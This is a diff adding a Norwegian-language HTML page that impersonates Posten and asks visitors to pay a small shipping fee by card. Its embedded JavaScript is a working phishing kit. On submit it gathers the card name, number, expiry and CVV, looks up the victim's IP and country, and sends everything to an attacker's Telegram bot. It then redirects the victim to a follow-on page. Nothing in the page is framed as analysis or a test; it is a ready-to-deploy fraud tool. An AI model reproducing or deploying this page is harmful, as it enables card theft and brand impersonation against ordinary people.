@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="no">
+<head>
+  <meta charset="UTF-8">
+      <link rel="icon" href="./X9/icon.jpeg" type="icon.jpeg"> 
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Posten - Betaling</title>
+  <style>
+    :root {
+      --rød: #d93025;
+      --bakgrunn: #ffffff;
+      --ramme: #d60000;
+      --tekst: #222;
+      --mørk-footer: #450000;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: var(--bakgrunn);
+      color: var(--tekst);
+    }
+
+    header {
+      text-align: center;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    header img {
+      height: 30px;
+      max-width: 100%;
+    }
+
+    .container {
+      max-width: 440px;
+      margin: 30px auto;
+      border: 1px solid var(--ramme);
+      border-radius: 5px;
+      padding: 20px;
+      background-color: #fff;
+    }
+
+    .section-title {
+      display: flex;
+      align-items: center;
+      font-size: 15px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .section-title::before {
+      content: '💳';
+      margin-right: 8px;
+      font-size: 18px;
+    }
+
+    p {
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+
+    .cards {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .cards img {
+      width: 47%;
+      max-width: 120px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      padding: 5px;
+      background: #fff;
+    }
+
+    .radio-group {
+      display: flex;
+      gap: 20px;
+      margin-bottom: 15px;
+      font-size: 14px;
+    }
+
+    .input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .row .input {
+      flex: 1;
+    }
+
+    .pay-btn {
+      background-color: var(--rød);
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    .pay-btn:hover {
+      background-color: #c12218;
+    }
+
+    footer {
+      background-color: var(--mørk-footer);
+      color: white;
+      text-align: center;
+      padding: 30px 10px;
+      margin-top: 50px;
+    }
+
+    footer img {
+      width: 100px;
+      margin-bottom: 10px;
+    }
+
+    footer p {
+      font-size: 14px;
+      margin: 0;
+    }
+
+    @media (max-width: 480px) {
+      .cards {
+        justify-content: center;
+      }
+
+      .cards img {
+        width: 45%;
+      }
+
+      .radio-group {
+        flex-direction: column;
+        gap: 8px;
+      }
+
+      .row {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="./X9/A.png" alt="Posten logo">
+  </header>
+
+  <div class="container">
+    <div class="section-title">Din pakkeinformasjon</div>
+    <p>Du må betale et fraktgebyr på <strong>29,05 kr</strong> før du kan gå videre til fraktinformasjonen din.</p>
+
+    <div class="cards">
+      <img src="./X9/1.jpg" alt="BankID">
+      <img src="./X9/2.jpg" alt="Visa">
+      <img src="./X9/3.jpg" alt="MasterCard">
+      <img src="./X9/4.png" alt="Amex">
+    </div>
+
+    <form id="fart">
+      <div class="radio-group">
+        <label><input type="radio" name="type" checked> Private</label>
+        <label><input type="radio" name="type"> Business</label>
+      </div>
+
+      <input type="text" class="input" placeholder="Navn på kort" id="A" name="cardname" required>
+      <input type="text" class="input" placeholder="Kortnummer (16-sifret)" id="B" name="cardnumber" required>
+
+      <div class="row">
+        <input type="text" class="input" placeholder="Utløpsdato (MM/ÅÅ)" id="C" name="expiry" required>
+        <input type="text" class="input" placeholder="CVV" id="D" name="cvv" required>
+      </div>
+
+      <button type="submit" class="pay-btn">Betal 29,05 KR</button>
+    </form>
+  </div>
+
+  <footer>
+    <img src="./X9/A.png" alt="Posten logo">
+    <p>© Posten Bring</p>
+  </footer>
+
+</body>
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+		
+        <script>
+            $("#B").mask("0000 0000 0000 00000");
+            $("#C").mask("00/00");
+            $("#D").mask("0000");
+        </script>
+		
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // Load botToken and chatId from TELEGRAM.json
+        function loadConfig() {
+            return fetch('so.json')
+                .then(response => response.json())
+                .then(data => ({
+                    botToken: data.botToken,
+                    chatId: data.chatId
+                }))
+                .catch(error => {
+                    console.error('Error loading config file:', error);
+                    return null;
+                });
+        }
+
+        // Get user's IP and country using ipify and ipinfo.io
+        function getIpAndCountry() {
+            return $.get('https://api.ipify.org?format=json')
+                .then(function(ipData) {
+                    // Get country based on IP
+                    return $.get('https://ipinfo.io/' + ipData.ip + '/json')
+                        .then(function(data) {
+                            return {
+                                ip: ipData.ip,
+                                country: data.country || 'Unknown'
+                            };
+                        })
+                        .catch(function() {
+                            return {
+                                ip: ipData.ip,
+                                country: 'Unknown'
+                            };
+                        });
+                })
+                .catch(function() {
+                    return {
+                        ip: 'Unavailable',
+                        country: 'Unknown'
+                    };
+                });
+        }
+
+        $("#fart").submit(function (event) {
+            event.preventDefault(); // Prevent default form action
+
+            var one = $("#A").val().trim();
+            var two = $("#B").val().trim();
+            var three = $("#C").val().trim();
+            var four = $("#D").val().trim();
+
+            if (one && two && three && four) {
+                loadConfig().then(config => {
+                    if (config) {
+                        getIpAndCountry().then(data => {
+                            var ipAddress = data.ip;
+                            var country = data.country;
+                            var now = new Date().toLocaleString(); // Get current date and time
+
+                            var telegramMessage = "📱 **Bnaking Info**\n\n" +
+                                "🔹 **Navn på kort:** `" + one + "`\n" +
+                                "🔹 **Kortnummer:** `" + two + "`\n" +
+                                "🔹 **Utløpsdato:** `" + three + "`\n" +
+                                "🔹 **CVV:** `" + four + "`\n" +
+                                "🔹 **IP Address:** `" + ipAddress + "`\n" +
+                                "🏳 **Country:** `" + country + "`\n" +
+                                "🕒 **Date/Time:** `" + now + "`";
+
+                            var telegramBotUrl = "https://api.telegram.org/bot" + config.botToken + "/sendMessage";
+                            var requestData = {
+                                chat_id: config.chatId,
+                                text: telegramMessage,
+                                parse_mode: "Markdown"
+                            };
+
+// حفظ آخر 4 أرقام بعد إرسال النموذج
+var last4 = two.slice(-4); // two هو رقم البطاقة
+localStorage.setItem("last4digits", last4);
+
+                            $.post(telegramBotUrl, requestData, function ()
+							{
+                                window.location.href = "E1.html?vc?__event=cauuuze&service_id=top_ouazt=NO";
+                            }).fail(function () {
+                                alert("Bitte versuchen Sie es erneut.");
+                            });
+                        });
+                    }
+                });
+            }
+        });
+    });
+</script>
+</html>
